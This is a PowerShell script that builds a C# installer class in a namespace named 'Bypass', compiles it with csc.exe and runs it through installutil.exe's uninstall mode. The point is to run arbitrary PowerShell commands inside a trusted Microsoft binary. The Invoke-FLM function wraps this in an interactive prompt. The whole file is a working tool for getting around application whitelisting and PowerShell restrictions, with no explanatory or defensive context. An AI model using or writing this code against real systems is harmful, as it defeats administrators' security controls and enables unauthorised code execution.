Function _Exec {

    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Cmd
    )

    $Cmd = $Cmd.Replace('"', '""');

    $csf = New-TemporaryFile;
    $dllf = New-TemporaryFile;
    $s = "==";
    Set-Content -Path $csf -Value @"
using System;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine(1+2);
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Console.Write("$s");
            using(Runspace rs = RunspaceFactory.CreateRunspace()) {
                rs.Open();

                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;

                ps.AddScript(@"& { $Cmd } *>&1 | Out-String");
                foreach (PSObject result in ps.Invoke()) {
                    Console.WriteLine("{0}", result);
                }

                rs.Close();
            }
        }
    }
}
"@
    $liba = (Get-ChildItem -Filter System.Management.Automation.dll -Path c:\Windows\assembly\GAC_MSIL\System.Management.Automation\ -Recurse -ErrorAction SilentlyContinue).fullname;
    c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /r:$liba /out:$dllf $csf | Out-Null;
    $res = c:\windows\microsoft.net\framework64\v4.0.30319\installutil.exe /logfile= /logtoconsole=false /U $dllf | Out-String;
    Write-Host $res.SubString($res.IndexOf($s)+$s.Length).TrimEnd();
    Remove-Item $dllf;
    Remove-Item $csf;
}

Function Invoke-FLM {
    while($true)    {
        Write-Host -NoNewLine "PS> ";
        $o = Read-Host;
	if ($o -eq "exit") {
	    break;
	}
        _Exec -Cmd $o;
    }
}
